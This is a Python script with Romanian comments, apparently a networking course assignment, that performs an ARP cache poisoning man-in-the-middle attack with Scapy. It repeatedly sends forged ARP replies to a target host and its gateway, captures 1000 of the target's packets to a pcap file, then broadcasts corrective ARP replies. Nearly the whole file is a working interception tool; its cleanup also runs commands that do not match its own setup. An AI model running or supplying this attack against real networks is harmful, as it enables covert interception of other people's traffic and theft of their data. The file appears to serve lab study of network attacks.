"""
ca sursa am folosit acest site: 
	https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
	
pentru unele neclaritati am folosit si ChatGPT 
"""


from scapy.all import *
import os
import signal
import sys
import threading
import time

# Parametrii procesului de otravire ARP
gateway_ip = "198.7.0.2"
gateway_mac = "02:42:c6:0a:00:03"

target_ip = "198.7.0.1"
target_mac = "02:42:c6:0a:00:01"

packet_count = 1000
conf.iface = "eth0"

# Restauram reteaua inversand atacul ARP
# Trimitem un răspuns ARP cu adresa MAC corecta si informatii despre adresa IP
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
#trimitem pachetele catre adresa broadcast care asigura ca toate discpozitivele din retea primesc toate informatiile actualizate
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.inet.ip.forwarding=0")
    os.system("iptables -t nat -D POSTROUTING -j MASQUERADE")

# Continuam sa trimitem raspunsuri ARP false pentru a pune procesul din mijloc sa intercepteze pachete
# Vom folosi adresa MAC a interfetei drept hwdst(adresa MAC a destinatiei) pentru raspunsul ARP
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack (CTRL-C to stop)")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(3)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack, restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

def arp_spoofing():
    # pornim atacul ARP spoofing
    print(f"[*] Gateway IP address: {gateway_ip}")
    print(f"[*] Target IP address: {target_ip}")
    print(f"[*] Gateway MAC address: {gateway_mac}")
    print(f"[*] Target MAC address: {target_mac}")

    # pornim un fir de executie pentru atacul ARP spoofing
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        # Capturam si salvam pachetele filtrate pe masina tinta
        sniff_filter = "ip host " + target_ip
        print(f"[*] Starting network capture, packet Count: {packet_count}. Filter: {sniff_filter}")
        packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
        wrpcap(target_ip + "_capture.pcap", packets)
        print(f"[*] Stopping network capture, restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print(f"[*] Stopping network capture, restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

# pornire program
if __name__ == '__main__':
    arp_spoofing()

